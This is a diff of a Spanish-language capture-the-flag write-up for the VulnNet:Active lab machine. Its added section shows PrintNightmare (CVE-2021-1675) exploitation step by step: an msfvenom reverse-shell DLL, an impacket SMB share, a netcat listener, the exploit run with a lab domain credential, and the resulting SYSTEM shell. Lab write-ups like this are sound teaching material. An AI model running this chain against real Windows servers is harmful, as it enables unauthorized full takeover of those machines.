@@ -208,7 +208,7 @@ La informacion obtenida sobre los puertos es un poco escueta, pero aun asi hay u
         SMB         10.10.33.40     445    VULNNET-BC3TCK1  NETLOGON        READ            Logon server share 
         SMB         10.10.33.40     445    VULNNET-BC3TCK1  SYSVOL          READ            Logon server share 
 
-  - Nos conectamos al recuerto Enterprise-Share y nos descargamos el scrip en Powershell que contine.
+  - Nos conectamos al recurso Enterprise-Share y descargamos el scrip en Powershell.
 
         ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/content]
         └─# smbclient //10.10.33.40/Enterprise-Share -U enterprise-security 
@@ -243,7 +243,7 @@ La informacion obtenida sobre los puertos es un poco escueta, pero aun asi hay u
 
       ![image](https://github.com/Esevka/CTF/assets/139042999/2d7fe7b9-5e4c-4339-b750-dc824e53284d)
 
-      - Nos ponemos en escucha y subimos nuestro script modificado.(Tarda un poco para recibir la R.shell)
+      - Nos ponemos en escucha y subimos nuestro script modificado.(Tarda un poco)
    
             ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/VulnNetActive]
             └─# rlwrap nc -lnvp 1988    
@@ -291,7 +291,70 @@ La informacion obtenida sobre los puertos es un poco escueta, pero aun asi hay u
 
       ![image](https://github.com/Esevka/CTF/assets/139042999/449dc8b5-bef5-42bd-9ec1-f82fdee17b7a)
 
-   Con la informacion obtenida encontramos que la maquina es vulnerable a un 
+
+-Con la informacion obtenida encontramos que la maquina es vulnerable a PrintNightmare (CVE-2021-1675 / CVE-2021-34527).
+
+    Exploit: [+] https://github.com/cube0x0/CVE-2021-1675
+    Info sobre PrintNightmare: [+]https://www.hackplayers.com/2021/07/printnightmare-la-enesima-pesadilla-en-windows.html
+
+  1) Nos creamos una dll que nos devulva una reverse shell
+   
+            ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/content]
+            └─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.92.151 LPORT=1989 -f dll -o esevka.dll
+            [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+            [-] No arch selected, selecting arch: x64 from the payload
+            No encoder specified, outputting raw payload
+            Payload size: 460 bytes
+            Final size of dll file: 9216 bytes
+            Saved as: esevka.dll
+
+  2) Creamos un servidor SMB para compartir nuestra dll.
+   
+            ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/content]
+            └─# impacket-smbserver -smb2support SHARE ./
+            Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+  3) Nos ponemos es escucha por el puerto indicado a la hora de crear la dll en este caso-->1989
+    
+            ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/content]
+            └─# rlwrap nc -lnvp 1989
+            listening on [any] 1989 ...
+
+  4) Ejecutamos el exploit
+   
+            ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/content]
+            └─# python3 cve-20211675.py vulnnet/enterprise-security:sand_0873959498@10.10.56.209 '\\10.9.92.151\SHARE\esevka.dll'
+            
+            [*] Connecting to ncacn_np:10.10.56.209[\PIPE\spoolss]
+            [+] Bind OK
+            [+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\UNIDRV.DLL
+            [*] Executing \??\UNC\10.9.92.151\SHARE\esevka.dll
+            [*] Try 1...
+            [*] Stage0: 0
+            [*] Try 2...
+            [...]
+
+  5) Obtenemos shell como nt authority\system
+
+            ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/content]
+            └─# rlwrap nc -lnvp 1989
+            listening on [any] 1989 ...
+            connect to [10.9.92.151] from (UNKNOWN) [10.10.56.209] 50019
+            whoami
+            Microsoft Windows [Version 10.0.17763.1757]
+            (c) 2018 Microsoft Corporation. All rights reserved.
+            
+            C:\Windows\system32>whoami
+            nt authority\system
+
+
+
+---
+---> Maquina Vulnnet:Active completa. <---
+---
+
+     
+
   
 
     
